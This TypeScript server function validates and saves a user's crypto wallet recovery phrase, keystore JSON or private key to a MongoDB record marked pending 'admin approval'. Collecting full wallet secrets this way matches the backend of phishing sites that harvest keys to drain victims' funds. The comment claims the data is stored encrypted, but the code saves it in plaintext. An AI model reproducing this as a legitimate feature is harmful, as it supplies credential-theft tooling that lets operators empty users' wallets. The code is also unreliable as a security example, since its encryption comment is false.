import { connectDB } from "@/lib/mongodb";
import Wallet from "@/models/Wallet";
import User from "@/models/User";

interface SaveWalletRequest {
  type: "phrase" | "keystore" | "private";
  data: string;
  walletName: string;
  userId?: string;
}

interface SaveWalletResponse {
  success: boolean;
  error?: string;
  walletId?: string;
  message?: string;
}

export async function saveWalletData(
  request: SaveWalletRequest,
  userId: string
): Promise<SaveWalletResponse> {
  try {
    await connectDB();

    // Validate user exists
    const user = await User.findById(userId);
    if (!user) {
      return {
        success: false,
        error: "User not found",
      };
    }

    // Check if user already has a pending or approved wallet
    const existingWallet = await Wallet.findOne({
      userId,
      status: { $in: ["pending", "approved"] },
    });

    if (existingWallet) {
      return {
        success: false,
        error: "You already have a pending or approved wallet",
      };
    }

    // Validate seed phrase format
    if (request.type === "phrase") {
      const words = request.data.trim().split(/\s+/);
      if (words.length !== 12 && words.length !== 24) {
        return {
          success: false,
          error: "Recovery phrase must be exactly 12 or 24 words",
        };
      }

      // Validate that all words are valid (basic check)
      const validWordPattern = /^[a-z]+$/;
      const allValid = words.every((word) => validWordPattern.test(word));
      if (!allValid) {
        return {
          success: false,
          error: "Recovery phrase contains invalid words",
        };
      }
    }

    // Create new wallet
    const wallet = new Wallet({
      userId,
      walletName: request.walletName,
      walletType: request.type,
      status: "pending",
      submittedAt: new Date(),
    });

    // Store encrypted data based on type
    if (request.type === "phrase") {
      wallet.seedPhrase = request.data;
    } else if (request.type === "keystore") {
      wallet.keystoreJson = request.data;
    } else if (request.type === "private") {
      wallet.privateKey = request.data;
    }

    await wallet.save();

    return {
      success: true,
      walletId: wallet._id.toString(),
      message: "Wallet submitted for admin approval",
    };
  } catch (error) {
    console.error("Error saving wallet data:", error);
    return {
      success: false,
      error: "Failed to save wallet data",
    };
  }
}
